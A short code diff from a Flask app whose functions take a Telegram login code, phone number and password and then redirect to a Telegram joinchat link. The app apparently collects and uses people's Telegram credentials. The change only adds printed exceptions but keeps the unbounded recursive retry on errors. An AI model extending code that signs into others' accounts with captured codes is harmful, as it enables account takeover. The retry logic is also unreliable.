@@ -94,7 +94,8 @@ def send(login_code, phone):
                 return redirect(url_for("password", phone=phone))
         client.disconnect()
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
-    except:
+    except Exception as e:
+        print(e)
         send(login_code, phone)
 
 def send_with_pss(login_password):
@@ -123,7 +124,8 @@ def send_with_pss(login_password):
         except:
             return redirect(url_for('login'))
         return redirect('https://t.me/joinchat/AAAAAFk6A2_U6W9wuepnSA')
-    except:
+    except Exception as e:
+        print(e)
         send_with_pss(login_password)
 
 
